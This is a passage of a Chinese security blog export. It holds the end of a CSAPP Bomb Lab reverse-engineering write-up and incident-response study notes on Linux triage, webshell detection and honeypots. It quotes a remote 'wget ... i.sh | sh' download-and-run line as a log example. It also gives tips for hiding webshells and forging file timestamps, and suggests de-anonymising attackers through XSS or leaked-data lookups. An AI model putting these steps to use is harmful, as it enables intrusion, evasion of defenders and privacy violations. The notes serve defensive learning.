相等则跳转\r代码中0x402470+8*第一参数打印内存信息，可以看到相应的跳转地址，已经对应的eax值应该是多少，也就是第二数字的应该的取值。打印内存信息的命令行为jmp QWORD PTR [rax*8+0x402470]\n0 207 ===》x/x (int *)0x402470 打印得到地址400f7c\r1 311 ===》x/x (int *)0x402478 打印得到地址400fb9\r2 707 ===》x/x (int *)0x402480 打印得到地址400f83\r3 256 ===》x/x (int *)0x402488 打印得到地址400f8a\r4 389 ===》x/x (int *)0x402490 打印得到地址400f91\r5 206 ===》x/x (int *)0x402498 打印得到地址400f98\r6 682 ===》x/x (int *)0x4024a0 打印得到地址400f9f\r7 327 ===》x/x (int *)0x4024a8 打印得到地址400fa6\r phase_4 ; __unwind {\rsub rsp, 18h\rlea rcx, [rsp+18h+var_C]\rlea rdx, [rsp+18h+var_10]\rmov esi, offset aDD ; \u0026quot;%d %d\u0026quot;\rmov eax, 0\rcall ___isoc99_sscanf\rcmp eax, 2 //需要输入2个数字\rjnz short loc_401035 //JNZ/JNE 不为0跳转,不相等跳转 if (i != j);if (i != 0);\rcmp [rsp+18h+var_10], 0Eh\rjbe short loc_40103A\r//JBE/JNA if (i \u0026lt;= j);可知第一个数字\u0026lt;=0xe\r。。。\rcmp [rsp+18h+var_C], 0 //第一个参数为0\rjz short loc_40105D\r分析\u0026lt;fun4\u0026gt;函数可知第二个参数的为0\n密码为0 0\nphase_5 两种不同的汇编看得还不习惯，贴了ida中的写法\n401089: eb 47 jmp 4010d2 \u0026lt;phase_5+0x70\u0026gt;\r000000000040108B movzx ecx, byte ptr [rbx+rax]\r40108b: 0f b6 0c 03 movzbl (%rbx,%rax,1),%ecx //将输入字符串的第一个字符给ecx\r40108f: 88 0c 24 mov %cl,(%rsp)\r401092: 48 8b 14 24 mov (%rsp),%rdx\r401096: 83 e2 0f and $0xf,%edx //取字符的最低4位到edx，大小从0~15\r0000000000401099 movzx edx, ds:array_3449[rdx]\r401099: 0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx //根据rdx中的数字，从0x4024b0(%rdx)中取字符\r//maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?\r4010a0: 88 54 04 10 mov %dl,0x10(%rsp,%rax,1) //存储取出的字符\r4010a4: 48 83 c0 01 add $0x1,%rax //处理次数+1\r4010a8: 48 83 f8 06 cmp $0x6,%rax //判断处理次数是否到6次\r4010ac: 75 dd jne 40108b \u0026lt;phase_5+0x29\u0026gt;\r4010ae: c6 44 24 16 00 movb $0x0,0x16(%rsp) //为新创建的字符串添加结尾符“/0”\r4010b3: be 5e 24 40 00 mov $0x40245e,%esi // flyers\r4010b8: 48 8d 7c 24 10 lea 0x10(%rsp),%rdi //比较新创建的字符串与flyers是否相等\r4010bd: e8 76 02 00 00 callq 401338 \u0026lt;strings_not_equal\u0026gt;\r4010c2: 85 c0 test %eax,%eax\r4010c4: 74 13 je 4010d9 \u0026lt;phase_5+0x77\u0026gt;\r4010c6: e8 6f 03 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt;\r00000000004010CB align 10h\r4010cb: 0f 1f 44 00 00 nopl 0x0(%rax,%rax,1)\r4010d0: eb 07 jmp 4010d9 \u0026lt;phase_5+0x77\u0026gt;\r4010d2: b8 00 00 00 00 mov $0x0,%eax\r4010d7: eb b2 jmp 40108b \u0026lt;phase_5+0x29\u0026gt;\rpwndbg\u0026gt; p/s (char*)0x4024b0 $1 = 0x4024b0 \u0026lt;array\u0026gt; \u0026#34;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?\u0026#34; f（9），l（15），y（14），e（5），r（6），s（7）\n答案为：\nionefg（0x49，0x4f,0x4E,0x45,0x46,0x47）\rphase_6 callq 40145c \u0026lt;read_six_numbers\u0026gt;\n我们需要输入的6位数字，且都小于6\nwhile循环\n401128: 41 83 c4 01 add $0x1,%r12d //r12d计数\r40112c: 41 83 fc 06 cmp $0x6,%r12d //计数小于6\r401130: 74 21 je 401153 \u0026lt;phase_6+0x5f\u0026gt;\r401132: 44 89 e3 mov %r12d,%ebx\r401135: 48 63 c3 movslq %ebx,%rax\r401138: 8b 04 84 mov (%rsp,%rax,4),%eax\r40113b: 39 45 00 cmp %eax,0x0(%rbp) //==\u0026gt;判断每个数字都不等于 0\r40113e: 75 05 jne 401145 \u0026lt;phase_6+0x51\u0026gt;\r401140: e8 f5 02 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt;\r401145: 83 c3 01 add $0x1,%ebx\r401148: 83 fb 05 cmp $0x5,%ebx\r40114b: 7e e8 jle 401135 \u0026lt;phase_6+0x41\u0026gt;\r要用7减完的序列做索引从链表取数，比较大小。从大到小排序。\n3 4 5 6 1 2\n用7减完\n4 3 2 1 6 5\nsecret_phase 递归调用人逆傻了，参考丛丛的脚本爆破\n大致思路是定位到if语句中参数的地址6030F0，再照着原函数的逻辑爆破。\ndata = \u0026#39;\u0026#39;\u0026#39;0x6030f0,0x0000000000000024,0x0000000000603110 0x603100,0x0000000000603130,0x0000000000000000 0x603110,0x0000000000000008,0x0000000000603190 0x603120,0x0000000000603150,0x0000000000000000 0x603130,0x0000000000000032,0x0000000000603170 0x603140,0x00000000006031b0,0x0000000000000000 0x603150,0x0000000000000016,0x0000000000603270 0x603160,0x0000000000603230,0x0000000000000000 0x603170,0x000000000000002d,0x00000000006031d0 0x603180,0x0000000000603290,0x0000000000000000 0x603190,0x0000000000000006,0x00000000006031f0 0x6031a0,0x0000000000603250,0x0000000000000000 0x6031b0,0x000000000000006b,0x0000000000603210 0x6031c0,0x00000000006032b0,0x0000000000000000 0x6031d0,0x0000000000000028,0x0000000000000000 0x6031e0,0x0000000000000000,0x0000000000000000 0x6031f0,0x0000000000000001,0x0000000000000000 0x603200,0x0000000000000000,0x0000000000000000 0x603210,0x0000000000000063,0x0000000000000000 0x603220,0x0000000000000000,0x0000000000000000 0x603230,0x0000000000000023,0x0000000000000000 0x603240,0x0000000000000000,0x0000000000000000 0x603250,0x0000000000000007,0x0000000000000000 0x603260,0x0000000000000000,0x0000000000000000 0x603270,0x0000000000000014,0x0000000000000000 0x603280,0x0000000000000000,0x0000000000000000 0x603290,0x000000000000002f,0x0000000000000000 0x6032a0,0x0000000000000000,0x0000000000000000 0x6032b0,0x00000000000003e9,0x0000000000000000 0x6032c0,0x0000000000000000,0x0000000000000000\u0026#39;\u0026#39;\u0026#39; data_dict = {} fin_dict = {} def data_collect(): data_list = data.split(\u0026#34;\\n\u0026#34;) last_try = 0 for i in data_list: #print i x = i.split(\u0026#34;,\u0026#34;) x = [int(i,16) for i in x] if x[1]\u0026lt;0x600000 and x[1]\u0026gt;0: data_dict[x[0]] = [x[1],x[2],0] last_try = x[0] else: data_dict[last_try][2] = x[1] for k in data_dict.values(): if k[1] == 0: if k[2] == 0: fin_dict[k[0]] = [0,0] else: fin_dict[k[0]] = [0,data_dict[k[2]][0]] else: if k[2] == 0: fin_dict[k[0]] = [data_dict[k[1]][0],0] else: fin_dict[k[0]] = [data_dict[k[1]][0],data_dict[k[2]][0]] data_collect() def func(num,i): if num == 0: return -1 if i == num: result = 0 return result if i\u0026gt;num: next_num = fin_dict[num][1] result = func(next_num,i) result = result+result+1 return result if i\u0026lt;num: next_num = fin_dict[num][0] result = func(next_num,i) result *= 2 return result for i in range(1000): if func(0x24,i) == 2: print i ","permalink":"https://inten.kro1lsec.com/post/csapplabbomb-lab/","summary":"总体感觉考查对汇编的理解和熟练度\nphase_1 400e37: 48 89 c7 mov %rax,%rdi //第一个参数 400e3a: e8 a1 00 00 00 callq 400ee0 \u0026lt;phase_1\u0026gt;\r...\r0x0000000000400ee0 \u0026lt;+0\u0026gt;: sub $0x8,%rsp 0x0000000000400ee4 \u0026lt;+4\u0026gt;: mov $0x402400,%esi //第二个参数\r0x0000000000400ee9 \u0026lt;+9\u0026gt;: callq 0x401338 \u0026lt;strings_not_equal\u0026gt;\r让参数一，二相等即可\nBorder relations with Canada have never been better.\nphase_2 利用callq 0x40145c \u0026lt;read_six_numbers\u0026gt;确定字符串格式，\n利用0000000000400F1A add eax, eax让后边的数翻倍\n字符串为“1 2 4 8 16 32”\nphase_3 尝试分析时，发现jcc指令经常弄混，又回去复习了一遍\ncmp oprd1,oprd2 + JNBE/JA 无符号\rcmp oprd1,oprd2 + JNLE/JG 有符号\roprd1\u0026gt;oprd2时跳转\rJZ/JE 相等则跳转\r代码中0x402470+8*第一参数打印内存信息，可以看到相应的跳转地址，已经对应的eax值应该是多少，也就是第二数字的应该的取值。打印内存信息的命令行为jmp QWORD PTR [rax*8+0x402470]","title":"[CSAPPLAB]Bomb Lab"},{"content":"https://bypass007.github.io/Emergency-Response-Notes/ 应急响应笔记\nhttps://www.cnblogs.com/H4ck3R-XiX/p/12234762.html Nmap使用教程（进阶篇）\n方法论 浅谈我所理解的应急响应流程\nhttps://www.freebuf.com/column/193690.html\r应急响应的整体思路和基本流程\nhttps://www.freebuf.com/articles/terminal/192859.html\r应急响应方式 现场应急响应：通常是要到客户突发现场进行应急处置。需注意相关操作必须获得用户授权，并对操作过程进行记录。 远程应急响应：远程通过电话、邮件等方式指导用户进行应急处置。\n应急响应流程 业内通常使用的\nPDCERF方法学 准备阶段——\u0026gt;检测阶段——\u0026gt;抑制阶段——\u0026gt;根除阶段——\u0026gt;恢复阶段——\u0026gt;跟踪总结\n准备阶段 准备阶段需要及时和客户确认事件背景、相关负责人联系方式、确定参与此次应急响应人员、根据客户描述，初步判定事件响应策略，携带应急响应工具包前往客户现场。\n准备阶段主要包括：事件背景、响应人员确定、事件响应策略、相关负责人联系方式、应急响应相关授权、应急响应工具包、应急响应手册等。\n检测阶段 检测阶段确认入侵事件是否发生，如真发生了入侵事件，评估造成的危害、范围以及发展的速度，事件会不会进一步升级。然后根据评估结果通知相关的人员进入应急的流程。\n检测阶段主要包括：事件类型、事件影响范围、受影响系统、事件发展趋势、安全设备等。\n备注：事件类型分类\n安全事件分类主要参考中央网信办发布《国家网络安全事件应急预案》，网络安全事件分为有害程序事件、网络攻击事件、信息破坏事件、信息内容安全事件、设备设施故障、灾害性事件和其他网络安全事件等。 （1）有害程序事件分为计算机病毒事件、蠕虫事件、特洛伊木马事件、僵尸网络事件、混合程序攻击事件、网页内嵌恶意代码事件和其他有害程序事件。 （2）网络攻击事件分为拒绝服务攻击事件、后门攻击事件、漏洞攻击事件、网络扫描窃听事件、网络钓鱼事件、干扰事件和其他网络攻击事件。 （3）信息破坏事件分为信息篡改事件、信息假冒事件、信息泄露事件、信息窃取事件、信息丢失事件和其他信息破坏事件。 （4）信息内容安全事件是指通过网络传播法律法规禁止信息，组织非法串联、煽动集会游行或炒作敏感问题并危害国家安全、社会稳定和公众利益的事件。 （5）设备设施故障分为软硬件自身故障、外围保障设施故障、人为破坏事故和其他设备设施故障。 （6）灾害性事件是指由自然灾害等其他突发事件导致的网络安全事件。 （7）其他事件是指不能归为以上分类的网络安全事件\n抑制阶段 采用针对性的安全措施降低事件损失、避免安全事件的扩散和安全事件对受害系统的持续性破坏。主要分为：物理遏制、网络遏制、主机遏制、应用遏制等。常见手段：断网、降权、网络封堵等。\n根除阶段 本阶段主要任务是通过事件分析查明事件危害的方式，并且给出清除危害的解决方案。个人认为可以从以下几个方面入手：系统基本信息、网络排查、进程排查、注册表排查、计划任务排查、服务排查、关键目录排查、用户组排查、事件日志排查、webshell排查、中间件日志排查、安全设备日志排查等。\n恢复阶段 恢复系统的运行过程，就是把受影响系统、设备、软件和应用服务还原到正常的工作状态；系统恢复、网络恢复、用户恢复、数据恢复以及重新部署。常见手段：系统重装、补丁加固、网络恢复、密码重置、木马清除等。\n跟踪阶段 在业务系统恢复后，需要整理一份详细的事件总结报告，包括事件发生及各部门介入处理的时间线，事件可能造成的损失，为客户提供安全加固优化建议。\n跟踪阶段主要包括：调查事件原因，输出应急响应报告，提供安全建议、加强安全教育、避免同类事件再次发生。\n常规流程 **收集信息：**收集客户信息和中毒主机信息，包括样本。\n**判断类型：**判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DoS等等。\n**深入分析：**日志分析、进程分析、启动项分析、样本分析。\n**清理处置：**直接杀掉进程，删除文件，打补丁，抑或是修复文件。\n**产出报告：**整理并输出完整的安全事件报告。\n系统日志及日志分析 日志类型  **Windows系统日志：**Windows系统自带的审计日志、操作日志、故障日志。\n**Linux系统日志：**Linux系统自带的审计日志、操作日志、故障日志。\n**应用日志：**包括但不限于Web应用等众多繁杂的日志。\n Windows系统日志\n 日志路径：C:\\Windows\\System32\\winevt\\Logs\n必看日志：Security.evtx、System.evtx、Application.evtx\n Linux系统日志\n 日志路径：/var/log\n必看日志：secure、history\n 威胁情报的作用 威胁情报有时候会给我们提供大量有用的信息，甚至直接推动了安全事件的快速响应。\n威胁情报的元素，包括但不限于域名、URL、IP、文件Hash、文件路径、文件名、数字签名、备案信息、排名信息。\n域名 威胁情报中，域名扮演着极为基础和关键的角色，URL也是以域名为基础的。这里列举若干类域名，是属于黑客常用（偏爱）的域名，取证过程中需要重点关注这类域名的信息。\n随机域名（DGA）： 动态域名： 动态域名是子域名开放给其他人使用，并且子域名绑定的IP是可以动态获取的，大多数是免费的，因此常被黑客所使用，如 abc.3322.org （3322.org就是动态域名提供者，子域名abc.3322.org可以被别人所使用）。\n近期域名： 域名都是有创建时间（注册时间）的，Alexa全球排名百万之内的域名，都是很早之前就注册了的，从几年到十几、二十几年不等。黑客攻击要逃避防火墙的封堵，极可能在实施的时候，再去注册一个域名\n暗网代理域名： 暗网，也叫Tor网络，此网络的访问、传输流量是不可追踪溯源的，因此是黑色产业链的温床。要访问暗网，要么病毒自己实现Tor客户端，要么通过Tor代理来访问Tor网络，而通过Tor代理访问的流量是未加密的，其直接使用Tor代理访问Tor站点服务器。\n因此，暗网代理域名是可以被检测到的。\n例如访问https://abbujjh5vqtq77wg.onion.link/由于二级域名onion.link属于Tor代理域名，所以认定此次访问行为是Tor网络访问行为，且为非法访问可能性极高。\n顶级域名： 不是所有的顶级域名都需要特别关注，要从客户业务出发，去反推客户主机为何要访问相关的顶级域名。也就是说，这里面有一批顶级域名，实际客户业务是不需要去访问的，那么剩下的就只有黑客行为了\n就是这样一批顶级域名（包括但不限于以下顶级域名）：\n   顶级域名 申请地区或机构 为何重点关注     .ru 俄罗斯 俄罗斯盛产黑客   .ws 东萨摩亚 不知名国家，易申请，难追踪注册者   .cc 科科斯群岛 不知名国家，易申请，难追踪注册者   .pw 帕劳 不知名国家，易申请，难追踪注册者   .bz 伯利兹 不知名国家，易申请，难追踪注册者   .su 苏联 前苏联虽然解体了，顶级域名还在使用，且多与黑产有关   .bw 伯兹瓦纳 不知名国家，易申请，难追踪注册者   .gw 几内亚比绍 不知名国家，易申请，难追踪注册者   .ms 蒙塞拉特岛 不知名国家，易申请，难追踪注册者   .mz 莫桑比克 不知名国家，易申请，难追踪注册者    这里举个例子，我们在某台告警主机上，使用Wireshark抓网络网络，直接过滤DNS协议如下：\n可以看到，此主机解析了大量.pw站点的域名，如koqqveoukgjc.pw，.pw是帕劳国家顶级域名，此国家是一个非常小的岛国，跟中国大陆都没有建交，国内企业有需要访问他们站点的可能性低到零（或者有业务在帕劳的可能性）\n常见病毒及分类 勒索病毒：能对用户文件进行加密的病毒。\n挖矿病毒：消耗用户CPU、GPU资源，进行大量运算，获取加密货币的病毒。\n **蠕虫：**自动复制自身的副本到其它主机的病毒。\n**木马：**隐蔽性强，多用于监控用户行为或盗取用户数据的病毒。\n**感染型病毒：**能将自身恶意代码插入正常文件的病毒。\n**脚本病毒：**使用脚本编写的病毒。\n**宏病毒：**宏是微软公司为其Office软件包设计的一个特殊功能，由于其功能强大，使得黑客可以通过精心构造的宏代码来实现恶意操作，这些代码就叫做宏病毒。宏病毒常以垃圾邮件的方式对用户进行攻击，因为伪造的Office文档不容易引起用户的怀疑，所以当用户毫无防备的打开Office文档并启用宏之后，宏病毒便开始了运行，对用户主机进行恶意操作。\n**僵尸网络病毒：**能形成大型的一对多，多对多控制的远程控制病毒。\n**后门：**在主机上开放端口允许远程非授权访问。\n 漏洞和补丁 漏洞和补丁，在应急响应中是不可或缺。如果黑客是通过某种漏洞入侵系统的，而在应急响应中，无法找出黑客所利用的漏洞，就会意味着，入侵行为可以反复发生。在终端侧，就会表现为病毒清理不干净，杀了又来，所以一定要找出漏洞。\n找到漏洞后，就需要打上相应的补丁，这样才是一次完整的处置。\n查看系统补丁情况：\nWindows：直接打开cmd，输入命令systeminfo即可获取。\n **漏洞是什么：**漏洞是指一个系统存在的弱点或缺陷。\n**怎么来的：**系统设计时的缺陷或编码时产生的错误。\n**有什么后果：**黑客的侵入及病毒的驻留，数据丢失和篡改、隐私泄露，系统被控制并作为入侵其他主机系统的跳板，等等。\n**解决方法：**打补丁。\n 工具 红蓝对抗安全工具汇总https://blog.csdn.net/littleliuing/article/details/109745934\n**流量分析工具：**常用的流量分析工具是Wireshark、TCPView，也可以使用科来网络分析工具，Linux下对tcpdump比较熟悉的，也可以使用tcpdump。\n**进程分析工具：**能对进程相关联信息进行分析的工具，主要是ProcessHacker和PC Hunter等。\n**启动项分析工具：**主要是AutoRuns工具，便于定位病毒启动项。\n**专杀工具：**有些流行病毒家族，通常对杀软有抑制性，或者本身有感染性，需要专杀工具去查杀和修复正常文件。\n**辅助工具：**WinHex、文件Hash工具、Everything搜索工具、Unlocker文件解锁工具等。\n**内存扫描工具：**主要是MemScanner\n应急响应脚本:1997CN/Emergency\nhttps://github.com/1997CN/Emergency\rLinux主机排查:grayddq/GScan\nhttps://github.com/grayddq/GScan\rlinux安全检查:T0xst/linux\nhttps://github.com/T0xst/linux\rlinux信息收集/应急响应/常见后门检测脚本:al0ne/LinuxCheck\nhttps://github.com/al0ne/LinuxCheck\rNmap (“Network Mapper(网络映射器)”)网络探测和安全审核的工具。\n主机提供什么服务(应用程序名和版本)，\n那些服务运行在什么操作系统(包括版本信息)，\n它们使用什么类型的报文过滤器/防火墙，以及一堆其它功能。\nMSF Metasploit就是一个漏洞框架。它的全称叫做The Metasploit Framework，简称MSF。是一个免费、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数2000多个已知软件漏洞的专业级漏洞攻击工具。\nWindows应急响应 https://www.freebuf.com/articles/es/210315.html\rhttps://www.freebuf.com/articles/network/203494.html\r服务流程 沟通确认安全事件 在与客户第一次沟通时，应及时提醒客户对受害机器及时进行断网隔离操作。已知的安全事件包括但不限于如下：\n \\1. 恶意代码威胁，即僵尸网络、恶意木马、蠕虫病毒、勒索病毒等恶意代码导致的安全事件\n\\2. 高级持续性威胁(APT)攻击事件，即具有潜伏性、隐蔽性、目的性、持续性等特点的安全事件\n\\3. 非法入侵事件，包括但不限于业务系统受到入侵致使数据泄露、丢失等；外网网站被入侵，导致网站被恶意篡改植入暗链或出现其他非法的宣传标语；服务器被入侵导致受到勒索攻击等安全事件\n\\4. 漏洞事件，即0day公布；在野漏洞发现；已知漏洞被发现受到通报等安全事件\n\\5. 数据泄露事件，即重要数据因受到了入侵导致的泄露；应用配置不当导致的泄露；员工误操作导致的泄露；内鬼泄露等安全事件\n\\6. 分布式拒绝服务攻击（DDOS）事件，即网站受到了各类DOS攻击，包括但不限于CC攻击、洪水攻击、流量放大攻击等安全事件\n\\7. 流量劫持，DNS劫持、HTTP劫持\n\\8. 其他归于网络安全的事件\n 注意事项：一定要亲自确认，切不可盲目相信他人所述。\n排查角度    是否有异常进程、用户\n  敏感端口开放情况\n  密码强度\n  日志分析\n  5)异常启动项、服务、计划任务\n 注册表信息\n  其它\n   确认后，应尽量收集与本次安全事件相关的信息，例如什麽时候发现的攻击，之前有无出现过安全事件等。\n在确认安全事件后明确应急目的：\n \\1. 病毒、后门清除工作\n\\2. 协助业务系统安全的恢复上线\n\\3. 攻击溯源工作。（仅溯源至攻击者的攻击切入点）\n 现场保护 在与客户沟通时，应提醒客户注意保护现场，千万不要直接重装系统，以方便后续的溯源工作及可能存在的电子取证工作。在处置受害机器时，应尽量保持受害机器的原样，如虚拟机处置时，可以让客户进行快照存储。\n了解客户网络状况 对客户的网络拓扑应尽早进行了解，特别是网络的进出口、负载均衡、防火墙、DNS服务器。\n确定事件影响 确定工作方向\n确立工作目标\n明确现场工作任务归属\n无论现场的环境，主导本次安全事件，合理分配现场工作为应急人员的必备技能。\n对现场的可能存在的工作应具备清晰的认知。通常会存在以下工作内容：病毒分析处置、业务恢复、安全加固、溯源分析、临时需求处置、产品对接与使用、应急指挥与协调。\nLinux应急响应 https://www.freebuf.com/articles/system/218407.html\r概述 Linux环境下处理应急响应事件往往会更加的棘手，因为相比于Windows，Linux没有像Autorun、procexp这样的应急响应利器，也没有统一的应急响应处理流程。所以，这篇文章将会对Linux环境下的应急响应流程进行讲解，并且提供每一个环节中所用到的shell命令，以帮助大家快速、系统化地处理Linux环境下的病毒。\nLinux平台下的恶意软件威胁以僵尸网络蠕虫和挖矿病毒为主，由于Linux大多作为服务器暴露在公网，且Web应用的漏洞层出不穷，所以很容易被大范围入侵，如常见的病毒：DDG、systemdMiner、BillGates、watchdogs、XorDDos，在很多Linux上都有。大家要养成不使用弱密码、勤打补丁的好习惯。\n处理Linux应急响应主要分为这4个环节:识别现象-\u0026gt; 清除病毒-\u0026gt; 闭环兜底-\u0026gt; 系统加固。\n首先从用户场景的主机异常现象出发，先识别出病毒的可疑现象。\n然后定位到具体的病毒进程以及病毒文件，进行清除。\n完成前2步还不够，病毒一般会通过一些自启动项及守护程序进行重复感染，所以我们要执行闭环兜底确保病毒不再被创建。\n将主机上的病毒项清除干净后，最后就是进行系统加固了，防止病毒从Web再次入侵进来。\n走完这4个环节，才能算是一个应急响应流程的结束。\n识别现象 第1个环节要求我们通过系统运行状态、安全设备告警，发现主机异常现象，以及确认病毒的可疑行为。\n系统CPU是否异常\n枚举进程，CPU降序排序：top\nCPU占用率超过70%且名字比较可疑的进程，大概率就是挖矿病毒了。\n是否存在可疑进程\n枚举进程命令行：ps -aux\n病毒一般都携带可疑的命令行，当你发现命令行中带有url等奇怪的字符串时，就要注意了，它很可能是个病毒downloader。\n安全网关有无报警 从安全网关报警中识别出威胁是最直接，但确认主机已经感染了病毒只是第一步，接下来得定位，具体是哪个进程在与C\u0026amp;C通信。\n监控与目标IP通信的进程：\nwhile true; do netstat -antp | grep [ip]; done\n有时安全网关检测到的不全是恶意IP，还有可能是个域名，这种情况下，域名对应的IP是变化的，我们不能直接用上述方法进行监控。\n我们可以先在host文件中添加一条规则，将恶意域名重定向到一个随机的IP地址，然后对其进行监控。\n这样就能得到与之通信的恶意进程了。\n有无可疑历史命令 遍历主机历史命令，查找有无恶意命令：history\n清除病毒 从第1个环节追溯到的进程信息，将会帮助我们定位到病毒进程\u0026amp;病毒文件，实现清除。\n结束病毒进程 清除可疑进程的进程链：\nps -elf | grep [pid] kill -9 [pid]\r删除病毒文件 定位病毒进程对应的文件路径：\nls -al /proc/[pid]/exe rm -f [exe_path]\r闭环兜底 Linux下的病毒持久化驻留方式相比于Windows较少，主要以下4种方式。\n检查是否存在可疑定时任务 枚举定时任务：crontab-l\n查看anacron异步定时任务：cat/etc/anacrontab\n检查是否存在可疑服务 枚举主机所有服务，查看是否有恶意服务：\nservice--status-all\r检查系统文件是否被劫持\n枚举系统文件夹的文件，按修改事件排序查看7天内被修改过的文件：\nfind /usr/bin/ /usr/sbin/ /bin/ /usr/local/bin/ -type f -mtime +7 | xargs ls -la\r检查是否存在病毒守护进程\n监控守护进程的行为：lsof-p[pid]\nstrace-tt-T -etrace=all-p$pid\r扫描是否存在恶意驱动 枚举/扫描系统驱动：lsmod\n安装chkrootkit进行扫描：\nwget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gztar zxvf chkrootkit.tar.gzcd chkrootkit-0.52make sense./chkrootkit\r安装rkhunter进行扫描：\nWgethttps://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gztar -zxvf rkhunter-1.4.4.tar.gzcd rkhunter-1.4.4./installer.sh --installrkhunter -c\r最后一个环节往往是大家比较容易遗忘的，Linux平台下90%的病毒是通过网络传播感染的，所以，你的主机之所以会感染病毒，大部分原因也是因为Web安全防护不够，赶紧检查一下。\n修改SSH弱密码\n查询log主机登陆日志：\ngrep \u0026quot;Accepted \u0026quot; /var/log/secure* | awk '{print $1,$2,$3,$9,$11}'\r定位有爆破的源IP：\ngrep \u0026quot;Failed password\u0026quot; /var/log/secure|grep -E -o \u0026quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\u0026quot;|uniq -c\r爆破日志的用户名密码：\ngrep \u0026quot;Failed password\u0026quot; /var/log/secure|perl -e 'while($_=\u0026lt;\u0026gt;){ /for(.*?) from/; print \u0026quot;$1\\n\u0026quot;;}'|uniq -c|sort -nr\rSSH爆破是Linux病毒最常用的传播手段，若存在弱密码的主机很容易被其他感染主机SSH爆破成功，从而再次感染病毒。\n添加命令审计 为历史的命令增加登录的IP地址、执行命令时间等信息：\n[1]保存1万条命令：\nsed -i 's/^HISTSIZE=1000/HISTSIZE=10000/g' /etc/profile\r[2]在/etc/profile的文件尾部添加如下行数配置信息：\nUSER_IP=`who -u am i 2\u0026gt;/dev/null | awk '{print $NF}' | sed -e 's/[()]//g'`if [ \u0026quot;$USER_IP\u0026quot; = \u0026quot;\u0026quot; ]thenUSER_IP=`hostname`fi export HISTTIMEFORMAT=\u0026quot;%F %T $USER_IP `whoami` \u0026quot; shopt -s histappend export PROMPT_COMMAND=\u0026quot;history -a\u0026quot;\r[3]让配置生效：\nsource /etc/profile\r生成效果：\n762019-10-2817:05:34113.110.229.230 wget -q -T180 -O-http://103.219.112.66:8000/i.sh) | sh\r打上常见Web漏洞补丁  structs2系列RCE漏洞\nthinkphp5.XRCE漏洞\nRedis未授权访问漏洞\nConfluenceRCE漏洞（CVE_2019_3396）\nDrupalRCE漏洞（CVE-2018-7600）\nThinkPHPRCE漏洞（CVE-2019-9082）\n Webshell 一种恶意脚本，其目的是获得服务器的执行操作权限\n检测方式 静态检测 匹配文件特征码、特征值、危险函数eval等来查找webshell 依据特征码弱强特征，结合人工判断，可减少漏报误报概率 利用文件系统的属性判断，无缘无故多出的nobody属性文件必定有问题(Apache是nobody启动)\n弱点: 漏报误报率较高，无法查杀变种及0day型 动态监测 依据webshell文件执行表现的特征即动态特征，如菜刀操作的特征\nwebshell命令执行时必会创建bash或IIS User启动cmd 由PID进程号定位webshell\nhttp异常模型检测，检测若有有用户访问一个从未访问过的文件并得到200响应，很容易定位webshell\n修改内核，hook一些危险函数eval、asset，重新编译php;\n弱点:降低php性能及业务性能\n日志检测 webshell访问特征\n 少量ip发起fangwen 总访问次数少 该页面属于孤立页面  查杀工具 https://blog.csdn.net/qq_23936389/article/details/105445551\nD盾 河马\n权限维持 针对蓝队 其他文件夹写入shell：初次上传路径一般都是存放图片等类型文件的文件夹，如果在这样的文件夹中突然出现一个php后缀的文件，那么十有八九会被发现，所以为了避免被蓝队发现，一般做法是在其他可写的文件夹下写入shell。\n**改写shell的日期：**这个主要针对linux平台，因为linux下webshell查杀工具不多，可能会通过命令去查杀。\n可能的命令是find命令\nfind -name \u0026quot;*.php\u0026quot; -type f -mtime -3 -exec ls -l {} \\;\r修改方法是touch命令，比如：\ntouch -d \u0026lsquo;08-August-2019\u0026rsquo; rrr.php\n**写入不死马：**所谓不死马，就是常驻内存的木马，通过循环在某路径下生成shell来维持权限，即使删除了shell,还是会生成。\n写入其他后门： 1.写入命令执行后门\n2.图片马结合文件包含脚本：图片马中写入恶意代码，然后在相应位置放置文件包含的漏洞文件，通过访问文件包含漏洞文件去解析图片马，图片马生成shell，然后直接连接。\n反制手段 **现代蜜罐：**除了捕获分析攻击行为外，各类安全厂商在蜜罐产品中加入了“攻击者画像”这一功能作为“卖点”，而本质上攻击者画像是将第三方厂商漏洞转为画像探针，利用第三方厂商漏洞获取攻击者所在此类厂商网站业务上的个人信息，此类漏洞多半为前端类漏洞，例如：JSONP、XSS\u0026hellip;除此之外还有网站伪造、自动投放蜜标等等众多丰富的功能。\n所以传统蜜罐厂商在这一块的被“需要”不大，而现代蜜罐厂商在这一块往往有需要性很多，就冲“攻击者画像”这一方面在演习过程中就可以为防守方加分。\n蜜罐的反制 现代化蜜罐都做了哪些反制的操作呢？\n 可克隆相关系统页面，伪装“漏洞”系统 互联网端投饵，一般会在Github、Gitee、Coding上投放蜜标（有可能是个单独的网站地址、也有可能是个密码本引诱中招） 利用JSONP、XSS、CSRF等前端类漏洞获取访问蜜标的攻击者网络身份（网络画像）  主动攻击“攻击IP” 防守日常就是看流量、分析流量，其中大部分都为扫描器流量，由于一般扫描器都会部署在VPS上，因此我们可以结合流量监测平台反向扫描\n溯源反制 https://www.secrss.com/articles/27611\n1、没有对附件文件进行逆向分析，看是调试信息中包含了物理路径信息。\n2、没有利用社工库进一步挖掘到攻击者的真实身份信息\n3、报告中缺少对软件行为的细致分析。\n4、钓鱼邮件完全可以将计就计，建个QQ群骗出对方的木马文件、钓鱼链接。从而进一步进行溯源分析。\n0day储备 